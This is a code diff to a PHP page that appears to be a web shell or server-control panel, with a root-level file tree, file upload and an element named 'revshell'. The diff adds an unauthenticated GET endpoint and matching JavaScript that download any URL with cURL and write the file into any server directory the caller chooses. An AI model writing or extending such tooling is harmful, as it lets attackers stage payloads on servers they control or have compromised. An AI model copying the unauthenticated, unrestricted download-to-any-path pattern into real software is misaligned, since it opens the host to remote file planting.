@@ -319,7 +319,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadFile']) && iss
     exit;
 }
 
+if ($_SERVER['REQUEST_METHOD'] === 'GET' 
+    && isset($_GET['urlUpload'], $_GET['urlUploadName'], $_GET['uploadPath'])) {
 
+    header('Content-Type: application/json');
+
+    $uploadPath = realpath($_GET['uploadPath']);
+    if (!$uploadPath || !is_dir($uploadPath)) {
+        echo json_encode(['success' => false, 'error' => 'Invalid upload path']);
+        exit;
+    }
+
+    $url = $_GET['urlUpload'];
+    $fileName = basename($_GET['urlUploadName']);
+    $destination = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
+
+    // Initialize cURL to download the file
+    $ch = curl_init($url);
+    $fp = fopen($destination, 'wb');
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_FAILONERROR, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+    $success = curl_exec($ch);
+    $curlErr = curl_error($ch);
+    curl_close($ch);
+    fclose($fp);
+
+    if ($success) {
+        echo json_encode(['success' => true]);
+    } else {
+        // Remove incomplete file
+        if (file_exists($destination)) unlink($destination);
+        echo json_encode(['success' => false, 'error' => "Failed to download file: $curlErr"]);
+    }
+    exit;
+}
 // ! FUNCTIONS STOP
 
 // ? VARIABLES START
@@ -600,7 +635,6 @@ $services = [
             </div>
         </div>
         <div id="file-tree-container" class="card span-row">
-            <input type="hidden" id="selectedPath" name="selectedPath" value="/">
             <h3>Folders And Files</h3>
             <ul id="file-tree">
                 <?php listDirectory('/'); ?>
@@ -608,6 +642,7 @@ $services = [
         </div>
         <div class="card">
             <div class="flex-column">
+                <p>Selected Folder: <input disabled id="selectedPath" name="selectedPath" value="/"></p>
                 <div class="flex-row">
                     <label for="uploadFileInput">Upload&nbsp;File:</label>
                     <input id="uploadFileInput" name="uploadFile" type="file">
@@ -724,6 +759,54 @@ $services = [
             console.warn('Output element with ID "revshell" not found.');
         }
     }
+</script>
+<script>
+    document.getElementById('urlUploadSubmit').addEventListener('click', () => {
+        const url = document.getElementById('urlUpload').value.trim();
+        const fileName = document.getElementById('urlUploadName').value.trim();
+        const uploadPath = document.getElementById('selectedPath').value || '/';
+
+        if (!url || !fileName) {
+            alert('Please enter both URL and file name.');
+            return;
+        }
+
+        // Encode params for GET request
+        const params = new URLSearchParams({
+            urlUpload: url,
+            urlUploadName: fileName,
+            uploadPath: uploadPath,
+        });
+
+        fetch(`${window.location.pathname}?${params.toString()}`, {
+            method: 'GET',
+            headers: { 'Accept': 'application/json' }
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.success) {
+                alert('URL upload successful!');
+                // Clear inputs
+                document.getElementById('urlUpload').value = '';
+                document.getElementById('urlUploadName').value = '';
+
+                // Optionally refresh folder view here, like after file upload
+                const selectedFolder = document.querySelector('.folder.selected');
+                if (selectedFolder) {
+                    const nested = selectedFolder.nextElementSibling;
+                    if (nested) {
+                        refreshFolder(uploadPath, nested);
+                    }
+                }
+
+            } else {
+                alert('URL upload error: ' + data.error);
+            }
+        })
+        .catch(err => {
+            alert('URL upload failed: ' + err.message);
+        });
+    });
 </script>
 </html>
 <?php
